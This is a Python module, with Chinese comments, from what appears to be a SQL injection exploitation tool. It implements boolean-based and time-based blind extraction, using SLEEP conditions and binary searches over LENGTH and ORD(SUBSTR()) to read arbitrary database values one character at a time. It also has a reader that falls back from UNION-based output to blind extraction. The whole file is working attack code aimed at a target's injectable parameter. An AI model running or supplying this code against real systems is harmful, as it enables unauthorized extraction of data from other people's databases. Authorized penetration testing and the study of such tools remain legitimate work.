"""盲注通道：布尔型与时间型，用于 UNION 不可回显的场景。"""

from __future__ import annotations

from .config import MAX_EXTRACT_LENGTH
from .detector import Injection
from .errors import NotExploitable
from .http_client import HttpClient
from .target import Target
from .utils import debug, info, similarity, warn

BOOLEAN_MARGIN = 0.001     # 择近判定时要求的最小差异
TIME_TOLERANCE = 0.7


class BlindExtractor:
    """逐字符提取表达式结果。

    布尔型通过比较“真页面 / 假页面”的相似度做判定；
    时间型通过 SLEEP 延迟做判定。
    """

    def __init__(self, client: HttpClient, target: Target, injection: Injection, delay: float = 3.0) -> None:
        self.client = client
        self.target = target
        self.injection = injection
        self.delay = delay
        self.mode = "time" if injection.technique == "time" else "boolean"
        self._true_text: str | None = None
        self._false_text: str | None = None
        if self.mode == "boolean":
            self._prepare_boolean()

    def _send(self, condition: str):
        return self.client.get(self.target.build(self.injection.param, self.injection.wrap(f" AND ({condition})")))

    def _prepare_boolean(self) -> None:
        true_resp = self._send("1=1")
        false_resp = self._send("1=0")
        self._true_text = true_resp.text
        self._false_text = false_resp.text
        # 真假页面若完全一致，布尔通道无效
        if similarity(true_resp.text, false_resp.text) > 0.9999:
            warn("布尔通道无差异，改用时间型盲注")
            self.mode = "time"
            return
        # 自检：oracle 必须能正确回答已知条件
        if not self.oracle("1=1") or self.oracle("1=0"):
            warn("布尔通道自检失败，改用时间型盲注")
            self.mode = "time"

    def oracle(self, condition: str) -> bool:
        if self.mode == "time":
            resp = self._send(f"IF({condition},SLEEP({self.delay:g}),0)")
            return resp.elapsed >= self.delay * TIME_TOLERANCE
        resp = self._send(condition)
        sim_true = similarity(self._true_text or "", resp.text)
        sim_false = similarity(self._false_text or "", resp.text)
        # 整页相似度差异往往很小，因此“择近”而非固定阈值
        if abs(sim_true - sim_false) < BOOLEAN_MARGIN:
            # 文本几乎一致时用页面长度判断
            len_true = abs(resp.length - len(self._true_text or ""))
            len_false = abs(resp.length - len(self._false_text or ""))
            debug(f"oracle {condition!r}: 相似度接近，改用长度判断")
            return len_true < len_false
        debug(f"oracle {condition!r}: true={sim_true:.4f} false={sim_false:.4f}")
        return sim_true > sim_false

    # ---------- 长度 / 字符 ----------
    def length(self, expression: str, max_len: int = MAX_EXTRACT_LENGTH) -> int:
        if not self.oracle(f"(SELECT IFNULL(LENGTH(({expression})),0)) > 0"):
            return 0
        low, high = 1, max_len
        while low < high:
            mid = (low + high + 1) // 2
            if self.oracle(f"(SELECT IFNULL(LENGTH(({expression})),0)) >= {mid}"):
                low = mid
            else:
                high = mid - 1
        return low

    def char_at(self, expression: str, position: int) -> str:
        condition = f"SELECT IFNULL(ORD(SUBSTR(({expression}),{position},1)),0)"
        if not self.oracle(f"({condition}) > 0"):
            return ""
        low, high = 0, 255
        while low < high:
            mid = (low + high) // 2
            if self.oracle(f"({condition}) > {mid}"):
                low = mid + 1
            else:
                high = mid
        return chr(low)

    def extract(self, expression: str, max_len: int = MAX_EXTRACT_LENGTH) -> str:
        total = self.length(expression, max_len)
        if total <= 0:
            return ""
        info(f"盲注提取 {expression}（{total} 字符，{self.mode} 模式）")
        chars = []
        for pos in range(1, total + 1):
            chars.append(self.char_at(expression, pos))
            print("\r" + "".join(chars), end="", flush=True)
        print()
        return "".join(chars)


class ValueReader:
    """优先使用 UNION 回显，失败时退回盲注。"""

    def __init__(self, exploiter, blind: BlindExtractor | None, dbms: str = "", prefer_union: bool = True) -> None:
        self.exploiter = exploiter
        self.blind = blind
        self.dbms = dbms
        self.use_union = prefer_union
        if prefer_union:
            self._probe_union()
        else:
            info("数据提取通道：盲注（已跳过 UNION 探测）")

    def _probe_union(self) -> None:
        try:
            marker = self.exploiter.union_extract("0x6f6b")
            self.use_union = marker.strip() == "ok"
        except Exception as exc:
            debug(f"UNION 通道不可用：{exc}")
            self.use_union = False
        if self.use_union:
            info("数据提取通道：UNION 回显")
        else:
            info("数据提取通道：盲注")

    def read(self, expression: str) -> str:
        if self.use_union:
            return self.exploiter.union_extract(expression)
        if not self.blind:
            raise NotExploitable("盲注通道初始化失败")
        return self.blind.extract(expression)
